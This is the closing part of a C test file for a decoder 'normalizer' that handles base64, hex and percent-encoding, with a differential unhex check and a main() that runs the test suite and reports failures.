		pa = kof_exe_unhex(a, n);
		pb = nr_unhex(b, n, 0, n, NULL);
		NCKF(pa == pb && !memcmp(a, b, n), "unhex seed %u", seed);
	}
}

int main(void)
{
	b64_known_answers();
	b64_refused();
	b64_needs_a_pipe_and_a_delimiter();
	b64_floor();
	b64_equals_rule();
	hex_known_answers();
	hex_delimiters();
	hex_printable();
	hex_floor_and_odd_tail();
	hex_forms_left_alone();
	hex_quoted_floor();
	pct_known_answers();
	pct_body_set();
	pct_delimiters();
	layers_to_the_bottom();
	single_pass_peels_one_layer();
	decode_fixed_point_and_identity();
	exposed_payload();
	differential_mixed();
	differential_noise();
	differential_single_passes();
	/* the generators must reach both the decoding and the refusing paths, or
	 * the equality above says little */
	NCKF(seen_changed > 3000u && seen_deep > 2000u && seen_plain > 1000u,
	     "generator reach: %u changed, %u layered, %u untouched", seen_changed, seen_deep,
	     seen_plain);
	printf("normalizer_decoders: %u checks, %u failed\n", nr_ok + nr_bad,
	       nr_bad);
	return nr_bad != 0;
}
